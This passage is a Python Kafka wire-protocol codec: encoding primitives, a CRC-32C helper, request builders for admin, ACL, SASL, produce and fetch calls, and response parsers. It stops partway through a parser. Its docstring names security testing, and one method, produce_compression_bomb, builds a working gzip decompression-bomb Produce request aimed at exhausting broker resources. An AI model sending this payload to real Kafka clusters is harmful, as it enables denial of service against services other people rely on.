"""
Kafka Wire Protocol Codec

Pure-Python implementation of the Kafka binary wire protocol encoding and
decoding. Covers all the request/response types needed for administration,
production, consumption, and security testing.

No external dependencies - uses only Python standard library.
"""

import struct
import gzip
import io
import time
from typing import Optional, List, Dict, Any, Tuple

# =========================================================================
#  CRC-32C (Castagnoli) - Required for RecordBatch v2
# =========================================================================

def _make_crc32c_table():
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = ((crc >> 1) ^ 0x82F63B78) if (crc & 1) else (crc >> 1)
        table.append(crc & 0xFFFFFFFF)
    return tuple(table)

_CRC32C_TABLE = _make_crc32c_table()

def crc32c(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc = _CRC32C_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return (crc ^ 0xFFFFFFFF) & 0xFFFFFFFF

# Self-test
assert crc32c(b"123456789") == 0xE3069283, "CRC-32C implementation error"


# =========================================================================
#  Varint Encoding (Kafka Record v2 uses zigzag-encoded signed varints)
# =========================================================================

def encode_unsigned_varint(value: int) -> bytes:
    result = bytearray()
    while value > 0x7F:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)


def decode_unsigned_varint(data: bytes, offset: int) -> Tuple[int, int]:
    value = 0
    shift = 0
    while True:
        b = data[offset]
        offset += 1
        value |= (b & 0x7F) << shift
        if not (b & 0x80):
            break
        shift += 7
    return value, offset


def encode_signed_varint(value: int) -> bytes:
    zigzag = (value << 1) ^ (value >> 63)
    if zigzag < 0:
        zigzag += (1 << 64)
    return encode_unsigned_varint(zigzag)


def decode_signed_varint(data: bytes, offset: int) -> Tuple[int, int]:
    zigzag, offset = decode_unsigned_varint(data, offset)
    value = (zigzag >> 1) ^ -(zigzag & 1)
    return value, offset


# =========================================================================
#  Kafka Protocol Primitives
# =========================================================================

def encode_int8(v: int) -> bytes:
    return struct.pack('b', v)

def encode_int16(v: int) -> bytes:
    return struct.pack('>h', v)

def encode_int32(v: int) -> bytes:
    return struct.pack('>i', v)

def encode_int64(v: int) -> bytes:
    return struct.pack('>q', v)

def encode_uint32(v: int) -> bytes:
    return struct.pack('>I', v)

def encode_string(s: str) -> bytes:
    b = s.encode('utf-8') if isinstance(s, str) else s
    return struct.pack('>h', len(b)) + b

def encode_nullable_string(s: Optional[str]) -> bytes:
    if s is None:
        return struct.pack('>h', -1)
    b = s.encode('utf-8') if isinstance(s, str) else s
    return struct.pack('>h', len(b)) + b

def encode_bytes(b: Optional[bytes]) -> bytes:
    if b is None:
        return struct.pack('>i', -1)
    return struct.pack('>i', len(b)) + b

def decode_int8(data: bytes, off: int) -> Tuple[int, int]:
    return struct.unpack_from('b', data, off)[0], off + 1

def decode_int16(data: bytes, off: int) -> Tuple[int, int]:
    return struct.unpack_from('>h', data, off)[0], off + 2

def decode_int32(data: bytes, off: int) -> Tuple[int, int]:
    return struct.unpack_from('>i', data, off)[0], off + 4

def decode_int64(data: bytes, off: int) -> Tuple[int, int]:
    return struct.unpack_from('>q', data, off)[0], off + 8

def decode_uint32(data: bytes, off: int) -> Tuple[int, int]:
    return struct.unpack_from('>I', data, off)[0], off + 4

def decode_string(data: bytes, off: int) -> Tuple[str, int]:
    length, off = decode_int16(data, off)
    if length < 0:
        return "", off
    s = data[off:off + length].decode('utf-8', errors='replace')
    return s, off + length

def decode_nullable_string(data: bytes, off: int) -> Tuple[Optional[str], int]:
    length, off = decode_int16(data, off)
    if length < 0:
        return None, off
    s = data[off:off + length].decode('utf-8', errors='replace')
    return s, off + length

def decode_bytes(data: bytes, off: int) -> Tuple[Optional[bytes], int]:
    length, off = decode_int32(data, off)
    if length < 0:
        return None, off
    return data[off:off + length], off + length


# =========================================================================
#  Kafka Error Codes
# =========================================================================

KAFKA_ERRORS = {
    0: "NONE", -1: "UNKNOWN_SERVER_ERROR", 1: "OFFSET_OUT_OF_RANGE",
    2: "CORRUPT_MESSAGE", 3: "UNKNOWN_TOPIC_OR_PARTITION",
    4: "INVALID_FETCH_SIZE", 5: "LEADER_NOT_AVAILABLE",
    6: "NOT_LEADER_OR_FOLLOWER", 7: "REQUEST_TIMED_OUT",
    8: "BROKER_NOT_AVAILABLE", 9: "REPLICA_NOT_AVAILABLE",
    10: "MESSAGE_TOO_LARGE", 11: "STALE_CONTROLLER_EPOCH",
    12: "OFFSET_METADATA_TOO_LARGE", 13: "NETWORK_EXCEPTION",
    14: "COORDINATOR_LOAD_IN_PROGRESS", 15: "COORDINATOR_NOT_AVAILABLE",
    16: "NOT_COORDINATOR", 17: "INVALID_TOPIC_EXCEPTION",
    18: "RECORD_LIST_TOO_LARGE", 19: "NOT_ENOUGH_REPLICAS",
    20: "NOT_ENOUGH_REPLICAS_AFTER_APPEND", 21: "INVALID_REQUIRED_ACKS",
    22: "ILLEGAL_GENERATION", 23: "INCONSISTENT_GROUP_PROTOCOL",
    24: "INVALID_GROUP_ID", 25: "UNKNOWN_MEMBER_ID",
    26: "INVALID_SESSION_TIMEOUT", 27: "REBALANCE_IN_PROGRESS",
    28: "INVALID_COMMIT_OFFSET_SIZE", 29: "TOPIC_AUTHORIZATION_FAILED",
    30: "GROUP_AUTHORIZATION_FAILED", 31: "CLUSTER_AUTHORIZATION_FAILED",
    33: "INVALID_TIMESTAMP", 35: "UNSUPPORTED_VERSION",
    36: "TOPIC_ALREADY_EXISTS", 37: "INVALID_PARTITIONS",
    38: "INVALID_REPLICATION_FACTOR", 39: "INVALID_REPLICA_ASSIGNMENT",
    40: "INVALID_CONFIG", 41: "NOT_CONTROLLER",
    42: "INVALID_REQUEST", 43: "UNSUPPORTED_FOR_MESSAGE_FORMAT",
    44: "POLICY_VIOLATION", 45: "OUT_OF_ORDER_SEQUENCE_NUMBER",
    46: "DUPLICATE_SEQUENCE_NUMBER", 47: "INVALID_PRODUCER_EPOCH",
    48: "INVALID_TXN_STATE", 49: "INVALID_PRODUCER_ID_MAPPING",
    50: "INVALID_TRANSACTION_TIMEOUT", 51: "CONCURRENT_TRANSACTIONS",
    52: "TRANSACTION_COORDINATOR_FENCED", 53: "TRANSACTIONAL_ID_AUTHORIZATION_FAILED",
    54: "SECURITY_DISABLED", 55: "OPERATION_NOT_ATTEMPTED",
    56: "KAFKA_STORAGE_ERROR", 57: "LOG_DIR_NOT_FOUND",
    58: "SASL_AUTHENTICATION_FAILED", 59: "UNKNOWN_PRODUCER_ID",
    60: "REASSIGNMENT_IN_PROGRESS", 61: "DELEGATION_TOKEN_AUTH_DISABLED",
    62: "DELEGATION_TOKEN_NOT_FOUND", 63: "DELEGATION_TOKEN_OWNER_MISMATCH",
    64: "DELEGATION_TOKEN_REQUEST_NOT_ALLOWED",
    65: "DELEGATION_TOKEN_AUTHORIZATION_FAILED",
    66: "DELEGATION_TOKEN_EXPIRED", 67: "INVALID_PRINCIPAL_TYPE",
    68: "NON_EMPTY_GROUP", 69: "GROUP_ID_NOT_FOUND",
    70: "FETCH_SESSION_ID_NOT_FOUND", 71: "INVALID_FETCH_SESSION_EPOCH",
    72: "LISTENER_NOT_FOUND", 73: "TOPIC_DELETION_DISABLED",
    74: "FENCED_LEADER_EPOCH", 75: "UNKNOWN_LEADER_EPOCH",
    76: "UNSUPPORTED_COMPRESSION_TYPE", 77: "STALE_BROKER_EPOCH",
    78: "OFFSET_NOT_AVAILABLE", 79: "MEMBER_ID_REQUIRED",
    80: "PREFERRED_LEADER_NOT_AVAILABLE", 81: "GROUP_MAX_SIZE_REACHED",
    82: "FENCED_INSTANCE_ID", 83: "ELIGIBLE_LEADERS_NOT_AVAILABLE",
    84: "ELECTION_NOT_NEEDED", 85: "NO_REASSIGNMENT_IN_PROGRESS",
    86: "GROUP_SUBSCRIBED_TO_TOPIC", 87: "INVALID_RECORD",
    88: "UNSTABLE_OFFSET_COMMIT",
}

def error_name(code: int) -> str:
    return KAFKA_ERRORS.get(code, f"UNKNOWN_ERROR_{code}")


# =========================================================================
#  API Keys
# =========================================================================

API_PRODUCE = 0
API_FETCH = 1
API_LIST_OFFSETS = 2
API_METADATA = 3
API_OFFSET_COMMIT = 8
API_OFFSET_FETCH = 9
API_FIND_COORDINATOR = 10
API_JOIN_GROUP = 11
API_HEARTBEAT = 12
API_LEAVE_GROUP = 13
API_SYNC_GROUP = 14
API_DESCRIBE_GROUPS = 15
API_LIST_GROUPS = 16
API_SASL_HANDSHAKE = 17
API_API_VERSIONS = 18
API_CREATE_TOPICS = 19
API_DELETE_TOPICS = 20
API_DELETE_RECORDS = 21
API_INIT_PRODUCER_ID = 22
API_OFFSET_FOR_LEADER_EPOCH = 23
API_ADD_PARTITIONS_TO_TXN = 24
API_ADD_OFFSETS_TO_TXN = 25
API_END_TXN = 26
API_TXN_OFFSET_COMMIT = 28
API_DESCRIBE_ACLS = 29
API_CREATE_ACLS = 30
API_DELETE_ACLS = 31
API_DESCRIBE_CONFIGS = 32
API_ALTER_CONFIGS = 33
API_ALTER_REPLICA_LOG_DIRS = 34
API_DESCRIBE_LOG_DIRS = 35
API_SASL_AUTHENTICATE = 36
API_CREATE_PARTITIONS = 37
API_CREATE_DELEGATION_TOKEN = 38
API_RENEW_DELEGATION_TOKEN = 39
API_EXPIRE_DELEGATION_TOKEN = 40
API_DESCRIBE_DELEGATION_TOKEN = 41
API_DELETE_GROUPS = 42
API_ELECT_LEADERS = 43
API_INCREMENTAL_ALTER_CONFIGS = 44
API_ALTER_PARTITION_REASSIGNMENTS = 45
API_LIST_PARTITION_REASSIGNMENTS = 46
API_DESCRIBE_CLIENT_QUOTAS = 48
API_ALTER_CLIENT_QUOTAS = 49
API_DESCRIBE_USER_SCRAM_CREDENTIALS = 50
API_ALTER_USER_SCRAM_CREDENTIALS = 51

API_NAMES = {
    0: "Produce", 1: "Fetch", 2: "ListOffsets", 3: "Metadata",
    8: "OffsetCommit", 9: "OffsetFetch", 10: "FindCoordinator",
    11: "JoinGroup", 12: "Heartbeat", 13: "LeaveGroup", 14: "SyncGroup",
    15: "DescribeGroups", 16: "ListGroups", 17: "SaslHandshake",
    18: "ApiVersions", 19: "CreateTopics", 20: "DeleteTopics",
    21: "DeleteRecords", 22: "InitProducerId", 29: "DescribeAcls",
    30: "CreateAcls", 31: "DeleteAcls", 32: "DescribeConfigs",
    33: "AlterConfigs", 34: "AlterReplicaLogDirs", 35: "DescribeLogDirs",
    36: "SaslAuthenticate", 37: "CreatePartitions",
    43: "ElectLeaders", 44: "IncrementalAlterConfigs",
    50: "DescribeUserScramCredentials", 51: "AlterUserScramCredentials",
}

# Config source map
CONFIG_SOURCE = {
    -1: "UNKNOWN", 0: "UNKNOWN", 1: "DYNAMIC_TOPIC",
    2: "DYNAMIC_BROKER", 3: "DYNAMIC_DEFAULT_BROKER",
    4: "STATIC_BROKER", 5: "DEFAULT_CONFIG", 6: "DYNAMIC_BROKER_LOGGER",
}

# Resource types for DescribeConfigs / AlterConfigs
RESOURCE_UNKNOWN = 0
RESOURCE_ANY = 1
RESOURCE_TOPIC = 2
RESOURCE_GROUP = 3
RESOURCE_BROKER = 4
RESOURCE_BROKER_LOGGER = 8


# =========================================================================
#  Request Building
# =========================================================================

class RequestBuilder:
    """Builds Kafka protocol requests."""

    def __init__(self, client_id: str = "kafka-mcp"):
        self.client_id = client_id.encode('utf-8')
        self._correlation_id = 0

    def _next_corr(self) -> int:
        self._correlation_id += 1
        return self._correlation_id

    def _header_v0(self, api_key: int, api_version: int) -> Tuple[bytes, int]:
        """Build request header v0 (non-flexible)."""
        corr = self._next_corr()
        hdr = struct.pack('>hhih', api_key, api_version, corr, len(self.client_id))
        hdr += self.client_id
        return hdr, corr

    def _frame(self, header: bytes, body: bytes) -> bytes:
        """Frame a request with 4-byte length prefix."""
        msg = header + body
        return struct.pack('>i', len(msg)) + msg

    # --- ApiVersions (key 18, v0) ---
    def api_versions(self) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_API_VERSIONS, 0)
        return self._frame(hdr, b''), corr

    # --- Metadata (key 3, v1) ---
    def metadata(self, topics: Optional[List[str]] = None) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_METADATA, 1)
        if topics is None:
            body = encode_int32(-1)  # null = all topics
        else:
            body = encode_int32(len(topics))
            for t in topics:
                body += encode_string(t)
        return self._frame(hdr, body), corr

    # --- SaslHandshake (key 17, v1) ---
    def sasl_handshake(self, mechanism: str = "PLAIN") -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_SASL_HANDSHAKE, 1)
        body = encode_string(mechanism)
        return self._frame(hdr, body), corr

    # --- SaslAuthenticate (key 36, v1) ---
    def sasl_authenticate(self, username: str, password: str) -> Tuple[bytes, int]:
        """SASL/PLAIN authentication: \x00username\x00password"""
        hdr, corr = self._header_v0(API_SASL_AUTHENTICATE, 1)
        sasl_bytes = b'\x00' + username.encode('utf-8') + b'\x00' + password.encode('utf-8')
        body = encode_bytes(sasl_bytes)
        return self._frame(hdr, body), corr

    def sasl_authenticate_raw(self, sasl_bytes: bytes) -> Tuple[bytes, int]:
        """SaslAuthenticate with raw SASL bytes (for SCRAM, OAUTHBEARER, etc.)."""
        hdr, corr = self._header_v0(API_SASL_AUTHENTICATE, 1)
        body = encode_bytes(sasl_bytes)
        return self._frame(hdr, body), corr

    # --- DescribeConfigs (key 32, v1) ---
    def describe_configs(self, resource_type: int, resource_name: str,
                         config_names: Optional[List[str]] = None) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_DESCRIBE_CONFIGS, 1)
        body = encode_int32(1)  # 1 resource
        body += encode_int8(resource_type)
        body += encode_string(resource_name)
        if config_names is None:
            body += encode_int32(-1)  # null = all configs
        else:
            body += encode_int32(len(config_names))
            for cn in config_names:
                body += encode_string(cn)
        body += encode_int8(0)  # include_synonyms = false
        return self._frame(hdr, body), corr

    # --- IncrementalAlterConfigs (key 44, v0) ---
    def incremental_alter_configs(self, resource_type: int, resource_name: str,
                                  configs: List[Dict[str, Any]],
                                  validate_only: bool = False) -> Tuple[bytes, int]:
        """
        configs: list of {"name": str, "op": 0=SET|1=DELETE|2=APPEND|3=SUBTRACT,
                          "value": str|None}
        """
        hdr, corr = self._header_v0(API_INCREMENTAL_ALTER_CONFIGS, 0)
        body = encode_int32(1)  # 1 resource
        body += encode_int8(resource_type)
        body += encode_string(resource_name)
        body += encode_int32(len(configs))
        for cfg in configs:
            body += encode_string(cfg["name"])
            body += encode_int8(cfg.get("op", 0))
            body += encode_nullable_string(cfg.get("value"))
        body += encode_int8(1 if validate_only else 0)
        return self._frame(hdr, body), corr

    # --- CreateTopics (key 19, v3) ---
    def create_topics(self, topics: List[Dict[str, Any]],
                      timeout_ms: int = 30000,
                      validate_only: bool = False) -> Tuple[bytes, int]:
        """
        topics: list of {"name": str, "partitions": int, "replication": int,
                         "configs": dict[str,str] (optional)}
        """
        hdr, corr = self._header_v0(API_CREATE_TOPICS, 3)
        body = encode_int32(len(topics))
        for t in topics:
            body += encode_string(t["name"])
            body += encode_int32(t.get("partitions", 1))
            body += encode_int16(t.get("replication", 1))
            body += encode_int32(0)  # 0 replica assignments
            cfgs = t.get("configs", {})
            body += encode_int32(len(cfgs))
            for k, v in cfgs.items():
                body += encode_string(k)
                body += encode_nullable_string(v)
        body += encode_int32(timeout_ms)
        body += encode_int8(1 if validate_only else 0)
        return self._frame(hdr, body), corr

    # --- DeleteTopics (key 20, v1) ---
    def delete_topics(self, topic_names: List[str],
                      timeout_ms: int = 30000) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_DELETE_TOPICS, 1)
        body = encode_int32(len(topic_names))
        for t in topic_names:
            body += encode_string(t)
        body += encode_int32(timeout_ms)
        return self._frame(hdr, body), corr

    # --- Produce (key 0, v3) ---
    def produce(self, topic: str, partition: int, records: List[Dict[str, Any]],
                acks: int = 1, timeout_ms: int = 30000,
                compression: str = "none") -> Tuple[bytes, int]:
        """
        records: list of {"key": bytes|None, "value": bytes|None, "headers": dict (optional)}
        compression: "none", "gzip"
        """
        hdr, corr = self._header_v0(API_PRODUCE, 3)
        batch = self._build_record_batch(records, compression)

        body = encode_int16(-1)  # transactional_id = null
        body += encode_int16(acks)
        body += encode_int32(timeout_ms)
        body += encode_int32(1)  # 1 topic
        body += encode_string(topic)
        body += encode_int32(1)  # 1 partition
        body += encode_int32(partition)
        body += encode_int32(len(batch))
        body += batch
        return self._frame(hdr, body), corr

    def produce_compression_bomb(self, topic: str, partition: int,
                                 decompressed_mb: int = 100,
                                 acks: int = 1,
                                 timeout_ms: int = 60000) -> Tuple[bytes, int]:
        """Build a gzip compression bomb Produce request."""
        hdr, corr = self._header_v0(API_PRODUCE, 3)

        value_size = decompressed_mb * 1024 * 1024
        rec_hdr = bytes([0])  # attributes
        rec_hdr += encode_signed_varint(0)  # timestampDelta
        rec_hdr += encode_signed_varint(0)  # offsetDelta
        rec_hdr += encode_signed_varint(-1)  # key = null
        rec_hdr += encode_signed_varint(value_size)  # value length
        rec_ftr = encode_signed_varint(0)  # 0 headers

        record_body_len = len(rec_hdr) + value_size + len(rec_ftr)
        rec_len_varint = encode_signed_varint(record_body_len)

        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode='wb', compresslevel=9) as gz:
            gz.write(rec_len_varint)
            gz.write(rec_hdr)
            chunk = b'\x00' * (1024 * 1024)
            remaining = value_size
            while remaining > 0:
                write_size = min(len(chunk), remaining)
                gz.write(chunk[:write_size])
                remaining -= write_size
            gz.write(rec_ftr)
        compressed_records = buf.getvalue()

        now_ms = int(time.time() * 1000)
        crc_data = struct.pack('>h', 1)  # attributes (gzip=1)
        crc_data += struct.pack('>i', 0)
        crc_data += struct.pack('>q', now_ms)
        crc_data += struct.pack('>q', now_ms)
        crc_data += struct.pack('>q', -1)
        crc_data += struct.pack('>h', -1)
        crc_data += struct.pack('>i', -1)
        crc_data += struct.pack('>i', 1)  # recordCount=1
        crc_data += compressed_records
        crc_val = crc32c(crc_data)

        batch_length = 4 + 1 + 4 + len(crc_data)
        batch = struct.pack('>q', 0)  # baseOffset
        batch += struct.pack('>i', batch_length)
        batch += struct.pack('>i', -1)  # partitionLeaderEpoch
        batch += struct.pack('b', 2)  # magic=2
        batch += struct.pack('>I', crc_val)
        batch += crc_data

        body = encode_int16(-1)  # transactional_id = null
        body += encode_int16(acks)
        body += encode_int32(timeout_ms)
        body += encode_int32(1)
        body += encode_string(topic)
        body += encode_int32(1)
        body += encode_int32(0)
        body += encode_int32(len(batch))
        body += batch

        decompressed_total = len(rec_len_varint) + record_body_len
        info = {
            "compressed_bytes": len(compressed_records),
            "decompressed_bytes": decompressed_total,
            "ratio": decompressed_total / max(len(compressed_records), 1),
            "batch_bytes": len(batch),
        }
        return self._frame(hdr, body), corr, info

    # --- Fetch (key 1, v4) ---
    def fetch(self, topic: str, partition: int, offset: int = 0,
              max_bytes: int = 1048576, max_wait_ms: int = 5000,
              min_bytes: int = 1) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_FETCH, 4)
        body = struct.pack('>i', -1)   # replica_id = -1 (consumer)
        body += struct.pack('>i', max_wait_ms)
        body += struct.pack('>i', min_bytes)
        body += struct.pack('>i', max_bytes)   # max_bytes (v3+)
        body += struct.pack('b', 0)           # isolation_level (v4+)
        body += struct.pack('>i', 1)          # 1 topic
        body += encode_string(topic)
        body += struct.pack('>i', 1)          # 1 partition
        body += struct.pack('>i', partition)
        body += struct.pack('>q', offset)     # fetch_offset
        body += struct.pack('>i', max_bytes)  # partition_max_bytes
        return self._frame(hdr, body), corr

    # --- ListOffsets (key 2, v1) ---
    def list_offsets(self, topic: str, partition: int,
                     timestamp: int = -1) -> Tuple[bytes, int]:
        """timestamp: -1 = latest, -2 = earliest"""
        hdr, corr = self._header_v0(API_LIST_OFFSETS, 2)
        body = struct.pack('>i', -1)  # replica_id = -1
        body += struct.pack('>b', 0)  # isolation_level = READ_UNCOMMITTED
        body += struct.pack('>i', 1)  # 1 topic
        body += encode_string(topic)
        body += struct.pack('>i', 1)  # 1 partition
        body += struct.pack('>i', partition)
        body += struct.pack('>q', timestamp)
        return self._frame(hdr, body), corr

    # --- DescribeAcls (key 29, v0) ---
    def describe_acls(self, resource_type: int = 1,  # ANY
                      resource_name: Optional[str] = None,
                      resource_pattern_type: int = 1,  # ANY (1=ANY, 3=LITERAL, 4=PREFIXED)
                      principal: Optional[str] = None,
                      host: Optional[str] = None,
                      operation: int = 1,  # ANY (1=ANY, 2=ALL, 3=READ, 4=WRITE...)
                      permission_type: int = 1  # ANY (1=ANY, 2=DENY, 3=ALLOW)
                      ) -> Tuple[bytes, int]:
        # v1 adds resource_pattern_type after resource_name
        hdr, corr = self._header_v0(API_DESCRIBE_ACLS, 1)
        body = encode_int8(resource_type)
        body += encode_nullable_string(resource_name)
        body += encode_int8(resource_pattern_type)
        body += encode_nullable_string(principal)
        body += encode_nullable_string(host)
        body += encode_int8(operation)
        body += encode_int8(permission_type)
        return self._frame(hdr, body), corr

    # --- CreateAcls (key 30, v1) ---
    def create_acls(self, acls: List[Dict[str, Any]]) -> Tuple[bytes, int]:
        """
        acls: [{"resource_type": int, "resource_name": str,
                "resource_pattern_type": int (default 3=LITERAL),
                "principal": str, "host": str,
                "operation": int, "permission_type": int}, ...]
        """
        hdr, corr = self._header_v0(API_CREATE_ACLS, 1)
        body = encode_int32(len(acls))
        for acl in acls:
            body += encode_int8(acl["resource_type"])
            body += encode_string(acl["resource_name"])
            body += encode_int8(acl.get("resource_pattern_type", 3))  # LITERAL
            body += encode_string(acl["principal"])
            body += encode_string(acl["host"])
            body += encode_int8(acl["operation"])
            body += encode_int8(acl["permission_type"])
        return self._frame(hdr, body), corr

    # --- DeleteAcls (key 31, v1) ---
    def delete_acls(self, filters: List[Dict[str, Any]]) -> Tuple[bytes, int]:
        """
        filters: [{"resource_type": int, "resource_name": str|None,
                   "resource_pattern_type": int (default 3=LITERAL),
                   "principal": str|None, "host": str|None,
                   "operation": int, "permission_type": int}, ...]
        """
        hdr, corr = self._header_v0(API_DELETE_ACLS, 1)
        body = encode_int32(len(filters))
        for f in filters:
            body += encode_int8(f["resource_type"])
            body += encode_nullable_string(f.get("resource_name"))
            body += encode_int8(f.get("resource_pattern_type", 3))  # LITERAL
            body += encode_nullable_string(f.get("principal"))
            body += encode_nullable_string(f.get("host"))
            body += encode_int8(f.get("operation", 0))
            body += encode_int8(f.get("permission_type", 0))
        return self._frame(hdr, body), corr

    # --- ListGroups (key 16, v0) ---
    def list_groups(self) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_LIST_GROUPS, 0)
        return self._frame(hdr, b''), corr

    # --- DescribeGroups (key 15, v0) ---
    def describe_groups(self, group_ids: List[str]) -> Tuple[bytes, int]:
        hdr, corr = self._header_v0(API_DESCRIBE_GROUPS, 0)
        body = encode_int32(len(group_ids))
        for gid in group_ids:
            body += encode_string(gid)
        return self._frame(hdr, body), corr

    # === Internal: Record Batch building ===

    def _build_record_batch(self, records: List[Dict[str, Any]],
                            compression: str = "none") -> bytes:
        """Build a RecordBatch v2 from a list of records."""
        now_ms = int(time.time() * 1000)
        attr = 0  # uncompressed by default

        # Build individual records
        raw_records = bytearray()
        for i, rec in enumerate(records):
            key = rec.get("key")
            value = rec.get("value")
            headers = rec.get("headers", {})

            if isinstance(key, str):
                key = key.encode('utf-8')
            if isinstance(value, str):
                value = value.encode('utf-8')

            r = bytes([0])  # attributes
            r += encode_signed_varint(0)  # timestampDelta
            r += encode_signed_varint(i)  # offsetDelta
            if key is None:
                r += encode_signed_varint(-1)
            else:
                r += encode_signed_varint(len(key))
                r += key
            if value is None:
                r += encode_signed_varint(-1)
            else:
                r += encode_signed_varint(len(value))
                r += value
            r += encode_signed_varint(len(headers))
            for hk, hv in headers.items():
                hk_bytes = hk.encode('utf-8') if isinstance(hk, str) else hk
                hv_bytes = hv.encode('utf-8') if isinstance(hv, str) else (hv or b'')
                r += encode_signed_varint(len(hk_bytes))
                r += hk_bytes
                r += encode_signed_varint(len(hv_bytes))
                r += hv_bytes

            raw_records += encode_signed_varint(len(r))
            raw_records += r

        # Optionally compress
        if compression == "gzip":
            attr = 1
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode='wb') as gz:
                gz.write(raw_records)
            compressed_records = buf.getvalue()
        else:
            compressed_records = bytes(raw_records)

        # Build CRC payload
        crc_data = struct.pack('>h', attr)
        crc_data += struct.pack('>i', len(records) - 1)  # lastOffsetDelta
        crc_data += struct.pack('>q', now_ms)  # baseTimestamp
        crc_data += struct.pack('>q', now_ms)  # maxTimestamp
        crc_data += struct.pack('>q', -1)  # producerId
        crc_data += struct.pack('>h', -1)  # producerEpoch
        crc_data += struct.pack('>i', -1)  # baseSequence
        crc_data += struct.pack('>i', len(records))
        crc_data += compressed_records
        crc_val = crc32c(crc_data)

        batch_length = 4 + 1 + 4 + len(crc_data)
        batch = struct.pack('>q', 0)  # baseOffset
        batch += struct.pack('>i', batch_length)
        batch += struct.pack('>i', -1)  # partitionLeaderEpoch
        batch += struct.pack('b', 2)  # magic=2
        batch += struct.pack('>I', crc_val)
        batch += crc_data
        return batch


# =========================================================================
#  Response Parsing
# =========================================================================

class ResponseParser:
    """Parses Kafka protocol responses."""

    @staticmethod
    def parse_api_versions(data: bytes) -> Dict[str, Any]:
        off = 0
        ec, off = decode_int16(data, off)
        count, off = decode_int32(data, off)
        apis = {}
        for _ in range(count):
            key, off = decode_int16(data, off)
            min_v, off = decode_int16(data, off)
            max_v, off = decode_int16(data, off)
            name = API_NAMES.get(key, f"API_{key}")
            apis[key] = {"name": name, "min_version": min_v, "max_version": max_v}
        return {"error_code": ec, "error": error_name(ec), "apis": apis}

    @staticmethod
    def parse_metadata(data: bytes) -> Dict[str, Any]:
        off = 0
        broker_count, off = decode_int32(data, off)
        brokers = []
        for _ in range(broker_count):
            node_id, off = decode_int32(data, off)
            host, off = decode_string(data, off)
            port, off = decode_int32(data, off)
            rack, off = decode_nullable_string(data, off)
            brokers.append({"node_id": node_id, "host": host, "port": port, "rack": rack})

        controller_id, off = decode_int32(data, off)
        topic_count, off = decode_int32(data, off)
        topics = []
        for _ in range(topic_count):
            ec, off = decode_int16(data, off)
            name, off = decode_string(data, off)
            is_internal, off = decode_int8(data, off)
            part_count, off = decode_int32(data, off)
            partitions = []
            for _ in range(part_count):
                p_ec, off = decode_int16(data, off)
                p_id, off = decode_int32(data, off)
                leader, off = decode_int32(data, off)
                rep_count, off = decode_int32(data, off)
                replicas = []
                for _ in range(rep_count):
                    r, off = decode_int32(data, off)
                    replicas.append(r)
                isr_count, off = decode_int32(data, off)
                isrs = []
                for _ in range(isr_count):
                    r, off = decode_int32(data, off)
                    isrs.append(r)
                partitions.append({
                    "error_code": p_ec, "partition_id": p_id,
                    "leader": leader, "replicas": replicas, "isr": isrs
                })
            topics.append({
                "error_code": ec, "name": name,
                "is_internal": bool(is_internal), "partitions": partitions
            })
        return {"brokers": brokers, "controller_id": controller_id, "topics": topics}

    @staticmethod
    def parse_describe_configs(data: bytes) -> Dict[str, Any]:
        off = 0
        throttle, off = decode_int32(data, off)
        res_count, off = decode_int32(data, off)
        resources = []
        for _ in range(res_count):
            ec, off = decode_int16(data, off)
            emsg, off = decode_nullable_string(data, off)
            rtype, off = decode_int8(data, off)
            rname, off = decode_string(data, off)
            cfg_count, off = decode_int32(data, off)
            configs = []
            for _ in range(cfg_count):
                cname, off = decode_string(data, off)
                cvalue, off = decode_nullable_string(data, off)
                read_only, off = decode_int8(data, off)
                source, off = decode_int8(data, off)
                is_sensitive, off = decode_int8(data, off)
                # v1: synonyms array
                syn_count, off = decode_int32(data, off)
                synonyms = []
                for _ in range(syn_count):
                    sname, off = decode_string(data, off)
                    svalue, off = decode_nullable_string(data, off)
                    ssource, off = decode_int8(data, off)
                    synonyms.append({"name": sname, "value": svalue,
                                     "source": CONFIG_SOURCE.get(ssource, str(ssource))})
                configs.append({
                    "name": cname, "value": cvalue,
                    "read_only": bool(read_only),
                    "source": CONFIG_SOURCE.get(source, str(source)),
                    "is_sensitive": bool(is_sensitive),
                    "synonyms": synonyms,
                })
            resources.append({
                "error_code": ec, "error_message": emsg,
                "resource_type": rtype, "resource_name": rname,
                "configs": configs,
            })
        return {"throttle_time_ms": throttle, "resources": resources}

    @staticmethod
    def parse_incremental_alter_configs(data: bytes) -> Dict[str, Any]:
        off = 0
        throttle, off = decode_int32(data, off)
        res_count, off = decode_int32(data, off)
        resources = []
        for _ in range(res_count):
            ec, off = decode_int16(data, off)
            emsg, off = decode_nullable_string(data, off)
            rtype, off = decode_int8(data, off)
            rname, off = decode_string(data, off)
            resources.append({
                "error_code": ec, "error": error_name(ec),
                "error_message": emsg,
                "resource_type": rtype, "resource_name": rname,
            })
        return {"throttle_time_ms": throttle, "resources": resources}

    @staticmethod
    def parse_create_topics(data: bytes) -> Dict[str, Any]:
        off = 0
        throttle, off = decode_int32(data, off)
        count, off = decode_int32(data, off)
        topics = []
        for _ in range(count):
            name, off = decode_string(data, off)
            ec, off = decode_int16(data, off)
            emsg, off = decode_nullable_string(data, off)
            topics.append({"name": name, "error_code": ec,
                          "error": error_name(ec), "error_message": emsg})
        return {"throttle_time_ms": throttle, "topics": topics}

    @staticmethod
    def parse_delete_topics(data: bytes) -> Dict[str, Any]:
        off = 0
        throttle, off = decode_int32(data, off)
        count, off = decode_int32(data, off)
        topics = []
        for _ in range(count):
            name, off = decode_string(data, off)
            ec, off = decode_int16(data, off)
            topics.append({"name": name, "error_code": ec, "error": error_name(ec)})
        return {"throttle_time_ms": throttle, "topics": topics}

    @staticmethod
    def parse_produce(data: bytes) -> Dict[str, Any]:
        off = 0
        topic_count, off = decode_int32(data, off)
        results = []
